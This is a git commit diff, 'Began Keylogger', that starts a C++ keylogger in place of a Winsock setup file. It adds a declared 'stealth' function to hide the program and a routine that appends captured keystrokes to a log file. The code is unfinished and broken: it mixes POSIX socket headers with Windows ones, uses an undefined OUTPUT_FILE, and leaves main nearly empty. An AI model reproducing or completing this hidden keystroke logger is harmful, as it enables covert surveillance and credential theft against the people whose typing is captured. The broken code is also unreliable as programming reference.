76a9135d07b0e00a48f90fe6443aa8ed134ba3fe
soup-tech <mbc0034@mix.wvu.edu>
2021-05-09 20:24:08 -0400

    Began Keylogger

--- src/c++/keylogger.cpp
+++ src/c++/keylogger.cpp
@@ -1,18 +1,46 @@
+#include <iostream>
 #include <stdio.h>
-#include <winsock2.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <cstring>
 
-#pragma comment(lib, "ws2_32.lib") // winsock library
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+#include <windows.h>
+#include <winuser.h>
+
+int saveLogs(int key_stroke, char *file);
+void stealth(); // Declare Stealth function to make your keylogger hidden
 
 int main(int argc, char *argv[]) {
-	
-	WSADATA wsa;
-	puts("Initialising Winsock...");
-	if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
-		puts("Failed to initialize Winsock. Error Code : %d\n", WSAGetLastError());
-		exit(1);
+	stealth(); // Calls stealth function
+	char i;
+
+
+}
+
+int saveLogs(int key_stroke, char *file) {
+	if ((key_stroke == 1) || (key_stroke == 2)) {
+		return 0;
 	}
-	puts("Socket initialized");
 
+	FILE *output_file;
+	output_file = fopen(file, "a");
 
-	return 0;
+	cout << key_stroke << endl;
+
+	if (key_stroke == 8) {
+		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
+	} else if (key_stroke == 13) {
+		fprintf(OUTPUT_FILE, "%s", "n");
+	} else if (key_stroke == 32) {
+		fprintf(OUTPUT_FILE, "%s", " ");
+	} else if (key_stroke == VK_TAB) {
+		fprintf(OUTPUT_FILE, "%s", "[TAB]");
+	} else if (key_stroke == VK_CONTROL) {
+		
+	}
 }
